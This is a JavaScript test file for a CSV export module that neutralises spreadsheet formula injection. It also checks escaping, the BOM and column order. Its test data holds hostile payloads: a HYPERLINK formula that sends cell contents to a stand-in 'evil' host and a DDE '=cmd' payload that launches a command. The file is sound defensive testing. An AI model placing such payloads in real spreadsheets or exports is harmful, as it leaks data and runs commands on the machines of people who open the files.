import test from "node:test";
import assert from "node:assert/strict";
import { csvCell, spreadsheetSafe, toCsv, toCsvFromRecords } from "../src/services/csvSafe.js";
import { buildSafeCsv } from "../src/services/auditExport.js";

// The attack §12 names: attacker-controlled text reaching an export an accountant opens.
test("a formula cell is neutralised", () => {
  for (const payload of [
    "=1+1",
    '=HYPERLINK("http://evil/?"&A1,"invoice")',
    "=cmd|'/c calc'!A1",
    "+1234",
    "-1+1",
    "@SUM(A1:A9)",
  ]) {
    const out = spreadsheetSafe(payload);
    assert.equal(out.startsWith("'"), true, `${payload} must not stay executable`);
    assert.equal(out.slice(1), payload, "the value itself must survive unchanged");
  }
});

// Spreadsheets trim leading whitespace before deciding a cell is a formula.
test("leading whitespace does not smuggle a formula through", () => {
  assert.equal(spreadsheetSafe("   =1+1").startsWith("'"), true);
  assert.equal(spreadsheetSafe("\t=1+1").startsWith("'"), true);
  assert.equal(spreadsheetSafe("\r=1+1").startsWith("'"), true);
});

test("ordinary text is left exactly as it is", () => {
  for (const value of ["کڕیاری یەکەم", "Ali Hassan", "1000", "note - with dash inside", "a=b"]) {
    assert.equal(spreadsheetSafe(value), value);
  }
});

// A negative number is a number, not a formula, and must stay usable as one.
test("a real negative number is not quoted into text", () => {
  assert.equal(spreadsheetSafe(-1400), "-1400");
  assert.equal(spreadsheetSafe(0), "0");
  assert.equal(spreadsheetSafe(false), "false");
});

test("empty values become empty cells, not the word null", () => {
  assert.equal(spreadsheetSafe(null), "");
  assert.equal(spreadsheetSafe(undefined), "");
});

test("a quote, a comma or a newline cannot break out of its cell", () => {
  assert.equal(csvCell('he said "hello"'), '"he said ""hello"""');
  assert.equal(csvCell("a,b"), '"a,b"');
  assert.equal(csvCell("line1\nline2"), '"line1\nline2"');
});

test("a row of cells is comma-joined and CRLF-terminated", () => {
  const csv = toCsv([["a", "b"], ["c", "d"]]);
  assert.equal(csv, '﻿"a","b"\r\n"c","d"');
});

// Excel needs the BOM to read Kurdish and Arabic correctly.
test("the file carries a BOM so Kurdish text opens correctly", () => {
  assert.equal(toCsv([["کڕیار"]]).charCodeAt(0), 0xfeff);
  assert.equal(toCsv([]).charCodeAt(0), 0xfeff);
});

test("records are written against an explicit header order", () => {
  const csv = toCsvFromRecords([{ b: 2, a: 1 }, { a: 3, b: 4 }], ["a", "b"]);
  assert.equal(csv, '﻿"a","b"\r\n"1","2"\r\n"3","4"');
});

test("a missing field becomes an empty cell rather than shifting the columns", () => {
  const csv = toCsvFromRecords([{ a: 1 }], ["a", "b", "c"]);
  assert.equal(csv, '﻿"a","b","c"\r\n"1","",""');
});

// Both exports must be safe; a single unguarded one is the whole hole.
test("the audit export and the report export neutralise the same payload", () => {
  const payload = "=cmd|'/c calc'!A1";
  assert.ok(buildSafeCsv([{ note: payload }]).includes(`"'${payload}"`),
    "the audit export must neutralise it");
  assert.ok(toCsv([[payload]]).includes(`"'${payload}"`),
    "the report export must neutralise it");
});

// Escaping runs after neutralising, so a payload containing quotes stays contained too.
test("a formula payload containing quotes is both neutralised and escaped", () => {
  const cell = csvCell('=HYPERLINK("http://evil/?"&A1,"x")');
  assert.equal(cell.startsWith(`"'=HYPERLINK(""`), true, cell);
  assert.equal(cell.endsWith('"'), true);
});
